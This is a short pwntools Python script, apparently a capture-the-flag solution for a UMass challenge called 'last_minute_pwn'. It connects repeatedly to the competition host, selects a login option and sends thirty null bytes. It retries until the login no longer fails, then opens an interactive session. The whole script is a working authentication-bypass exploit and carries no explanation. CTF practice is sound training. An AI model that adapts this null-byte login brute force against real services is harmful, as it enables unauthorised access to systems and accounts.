from pwn import *
while(1):
    io = remote('last_minute_pwn.pwn.umasscybersec.org', 7293)
    io.recvuntil(b'>> ')
    io.sendline(b'2')
    io.recvuntil(b'>> ')
    io.sendline(b'\0'*30)
    res = io.recvline()
    if res == b'Login failed\n':
        io.close()
        continue
    break
io.interactive()